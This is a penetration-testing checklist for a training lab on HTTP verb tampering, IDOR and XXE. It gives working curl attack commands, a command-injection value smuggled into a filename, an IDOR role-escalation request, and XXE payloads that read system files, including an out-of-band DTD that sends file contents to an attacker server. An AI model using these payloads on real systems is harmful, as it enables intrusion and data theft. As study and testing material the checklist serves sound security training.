# Web Attacks Checklist

**Module covers:** HTTP Verb Tampering | IDOR | XXE Injection

---

## HTTP Verb Tampering

### Auth Bypass (Insecure Config)
- [ ] Identify page behind HTTP Basic Auth prompt
- [ ] Check allowed methods: `curl -i -X OPTIONS http://<TARGET>/admin/page.php`
- [ ] Try non-standard verbs one by one — 200 OK without login prompt = bypass:
  - `curl -i -X HEAD http://<TARGET>/admin/page.php`
  - `curl -i -X DELETE http://<TARGET>/admin/page.php`
  - `curl -i -X PUT http://<TARGET>/admin/page.php`
  - `curl -i -X PATCH http://<TARGET>/admin/page.php`
- [ ] After 200 OK — verify action executed: `curl -s http://<TARGET>/` (check for flag or confirmation)

### Filter Bypass (Insecure Coding)
- [ ] Find form that applies a security filter (blocked by WAF/PHP filter)
- [ ] Identify current request method (GET or POST) from form HTML
- [ ] Switch to the OTHER method with malicious payload:
  - Was GET → switch to POST: `curl -s -X POST http://<TARGET>/index.php --data-urlencode "filename=file; cp /flag.txt ./"`
  - Was POST → switch to GET: `curl -s "http://<TARGET>/index.php?filename=file;%20cp%20/flag.txt%20./"`
- [ ] Retrieve result: `curl -s http://<TARGET>/flag.txt`

---

## IDOR

### Reconnaissance
- [ ] Look for object references in URL: `?uid=`, `?id=`, `?file=`, `?contract=`
- [ ] Check API endpoints: `/api/resource/1`, `/profile/api.php/profile/1`
- [ ] Read JS source for AJAX patterns: `curl -s http://<TARGET>/ | grep -i "ajax\|redirect\|fetch\|uid\|contract"`
- [ ] Determine request method from JS: `$.redirect → POST` | `window.location → GET`

### Identify Reference Type
- [ ] Integer? → enumerate sequentially
- [ ] Looks like base64 (`MQ==`)? → `echo -n 1 | base64 -w 0` and decode back to verify
- [ ] Looks like hash? → find hash function in JS source (MD5, SHA1, btoa, etc.)

### Mass Enumeration
- [ ] Write enumeration to file (avoid terminal line-wrap): `cat > /tmp/enum.sh << 'EOF'`
- [ ] For POST endpoints: `curl -s -X POST "$url/documents.php" -d "uid=$i"`
- [ ] For GET endpoints with base64: `curl -s -G --data-urlencode "contract=$b64" "$url/download.php"`
- [ ] `-G --data-urlencode` handles `=` padding automatically — do NOT manually URL-encode
- [ ] Look for flag in PDF/text content using `| strings | grep "HTB{"`

### API IDOR (Chained Attack)
- [ ] Enumerate UIDs to find all users: `for i in {1..20}; do curl -s http://<TARGET>/api.php/profile/$i; echo; done`
- [ ] Identify admin user (by role name in response)
- [ ] Get OWN uid and uuid (GET own profile)
- [ ] Escalate own role using admin role name:
  ```bash
  curl -s -X PUT "http://<TARGET>/api.php/profile/<OWN_uid>" \
    -H "Content-Type: application/json" \
    -b cookies.txt \
    -d '{"uid":"<OWN_uid>","uuid":"<OWN_uuid>","role":"web_admin","full_name":"X","email":"x@x.com","about":"X"}'
  ```
- [ ] Verify: GET own profile to confirm role changed
- [ ] Access admin functionality, find flag

### Common IDOR Fixes
- [ ] If GET returns empty list → try POST with same params (check JS for `$.redirect`)
- [ ] If `uid mismatch` error → JSON uid must exactly match URL path uid
- [ ] If `uuid mismatch` → re-GET that user's profile to get correct uuid
- [ ] Keep `about` field short in JSON — multiline breaks JSON structure

---

## XXE

### Reconnaissance
- [ ] Find any form that sends XML (check Content-Type: application/xml in Burp/curl)
- [ ] Check file uploads for SVG, DOCX, XLSX, PDF (all XML-based)
- [ ] Try changing JSON Content-Type to application/xml on API endpoints

### Confirm Entity Injection
- [ ] Send test entity to each field, check which is reflected in response:
  ```bash
  curl -s -X POST http://<TARGET>/submitDetails.php \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "TESTVALUE">]><root><name>x</name><tel>x</tel><email>&xxe;</email><message>x</message></root>'
  ```
- [ ] "TESTVALUE" in response = injection confirmed in that field

### Choose Attack Method (see decision tree below)
- [ ] Is output reflected?
  - [ ] **Yes, text file** → Basic file read: `file:///etc/passwd`
  - [ ] **Yes, PHP file** → PHP filter: `php://filter/convert.base64-encode/resource=file.php`
  - [ ] **Yes, other/unknown** → CDATA method (needs attacker server)
  - [ ] **No, errors shown** → Error-based XXE (needs attacker server)
  - [ ] **No, completely blind** → Blind OOB (needs attacker server + PHP listener)

### Basic File Read
- [ ] Replace entity value with `SYSTEM "file:///etc/passwd"`
- [ ] Send and read response

### PHP Source Read
- [ ] Entity value: `SYSTEM "php://filter/convert.base64-encode/resource=<filename>.php"`
- [ ] `echo "<BASE64>" | base64 -d`

### CDATA Method Setup
- [ ] Write `/tmp/xxe.dtd`:
  ```
  <!ENTITY joined "%begin;%file;%end;">
  ```
- [ ] Start Python server: `cd /tmp && python3 -m http.server 8000 &`
- [ ] Send payload referencing external DTD (see methodology for full command)
- [ ] Read output directly from reflected field

### Blind OOB Setup
- [ ] Write `/tmp/index.php`:
  ```php
  <?php
  if(isset($_GET['content'])){
      error_log("\n\n" . base64_decode($_GET['content']));
  }
  ?>
  ```
- [ ] Write `/tmp/xxe.dtd`:
  ```
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file">
  <!ENTITY % oob "<!ENTITY content SYSTEM 'http://<OUR_IP>:8000/?content=%file;'>">
  ```
- [ ] Start PHP server: `cd /tmp && php -S 0.0.0.0:8000 &`
- [ ] Send payload referencing DTD, check server log for base64
- [ ] Decode: `echo "<BASE64>" | base64 -d`

### Key Files to Read
- [ ] `/etc/passwd` — confirm XXE works, find usernames
- [ ] `index.php`, `connection.php`, `config.php` — credentials, flags
- [ ] `/etc/nginx/sites-enabled/default` or `/etc/apache2/apache2.conf` — find web root path
- [ ] Current script source: `php://filter/convert.base64-encode/resource=submitDetails.php`

### Common XXE Fixes
- [ ] Basic XXE empty on PHP file → use php://filter/convert.base64-encode
- [ ] CDATA payload fails → must use external DTD (XML forbids joining internal+external entities inline)
- [ ] `!` in DTD content breaks bash command → write DTD file with nano
- [ ] base64 response has line breaks → `echo "<BASE64>" | tr -d '\n' | base64 -d`
- [ ] No request at attacker server → check attacker IP is correct and reachable from target

---

## Universal Reminders
- [ ] Always manually test one request before looping — confirm field names, response format
- [ ] Write scripts to /tmp files to avoid terminal line-wrap bugs
- [ ] Read JS source before assuming GET vs POST for endpoints
- [ ] Both Python and PHP servers block port 8000 if already running — check with `kill %1` first
- [ ] curl `-i` shows headers, `-s` silences progress — use both as needed
